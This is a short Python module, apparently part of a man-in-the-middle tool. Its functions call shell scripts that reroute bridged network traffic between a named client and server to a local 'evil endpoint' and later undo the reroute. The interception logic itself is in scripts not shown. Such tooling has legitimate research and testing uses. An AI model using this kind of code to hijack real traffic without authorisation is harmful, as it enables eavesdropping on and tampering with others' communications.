import os
import subprocess
import sys

def thisdir():
	return os.path.dirname(os.path.realpath(__file__))

def execute(command_parts):
    try:
        subprocess.check_call(command_parts, stderr=subprocess.STDOUT)
        return True
    except Exception as e:
        print("An error occurred during execution of " + ' '.join(str(w) for w in command_parts))
        print(str(e))
        return False

def start_hijack(context):
    # Reroute bridge traffic to our evil endpoint
    execute([
        thisdir() + "/" + "bridge-reroute.sh",
        "--bridge", context.listen_intf,
        "--server", context.server_ip, context.server_mac, str(context.server_port),
        "--client", context.client_ip, context.client_mac,
        "--local-port", os.environ['LOCALPORT']
    ]) or sys.exit(1)

def stop_hijack(context):
    # Undo bridge traffic reroute
    execute([
        thisdir() + "/" + "bridge-reroute-undo.sh",
        "-b", context.listen_intf,
        "-c", context.client_ip
    ])
